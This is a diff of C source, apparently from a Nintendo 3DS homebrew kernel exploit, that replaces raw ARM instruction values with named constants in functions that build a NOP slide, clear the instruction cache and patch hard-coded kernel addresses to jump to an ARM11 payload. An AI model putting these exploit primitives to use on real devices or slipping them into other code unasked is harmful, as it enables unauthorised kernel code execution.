@@ -26,6 +26,10 @@
 #include <dirent.h>
 #include "arm11.h"
 
+static const int32_t bx_lr = 0xE12FFF1E; // bx lr
+static const int32_t nop = 0xE320F000; // nop {0}
+static const int32_t ldr_pc_pc_4 = 0xE51FF004; // ldr pc, [pc, #4]
+
 static u32 nopSlide[0x1000] __attribute__((aligned(0x1000)));
 static const size_t bufSize = 0x10000;
 static int32_t *buf;
@@ -206,8 +210,8 @@ static int arm11Kxploit()
 
 	 // Part 2: trick to clear icache
 	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
-		buf[i] = 0xE1A00000; // ARM NOP instruction
-	buf[i - 1] = 0xE12FFF1E; // ARM BX LR instruction
+		buf[i] = nop;
+	buf[i - 1] = bx_lr;
 
 	gshaxCopy(nopSlide, buf, bufSize);
 
@@ -228,7 +232,6 @@ static int arm11Kxploit()
 static void arm9Exploit()
 {
 	int (* const reboot)(int, int, int, int) = (void *)0xFFF748C4;
-	const int32_t j = 0xE51FF004; // ldr pc, [pc, #4]
 	int32_t *src, *dst;
 
 	__asm__ ("clrex");
@@ -247,10 +250,10 @@ static void arm9Exploit()
 	*(int32_t *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
 	*(int32_t *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook
 
-	*(int32_t *)0xEFFE4DD4 = j;
+	*(int32_t *)0xEFFE4DD4 = ldr_pc_pc_4;
 	*(int32_t *)0xEFFE4DD8 = 0xFFFF0C80; // arm11Payload
 
-	*(int32_t *)0xEFFF497C = j;
+	*(int32_t *)0xEFFF497C = ldr_pc_pc_4;
 	*(int32_t *)0xEFFF4980 = 0x1FFF4C84; // arm11Payload + 4
 
 	CleanAllDcache();
@@ -268,7 +271,6 @@ static void test()
 
 static void __attribute__((naked)) arm11Kexec()
 {
-	const int32_t nop = 0xE320F000;
 
 	__asm__("add sp, sp, #8\n");
 
@@ -300,8 +302,8 @@ int exploit()
 	HB_ReprotectMemory(nopSlide, 4, 7, &result);
 
 	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
-		nopSlide[i] = 0xE1A00000; // ARM NOP instruction
-	nopSlide[i-1] = 0xE12FFF1E; // ARM BX LR instruction
+		nopSlide[i] = nop;
+	nopSlide[i-1] = bx_lr;
 	HB_FlushInvalidateCache();
 
 #ifdef DEBUG_PROCESS
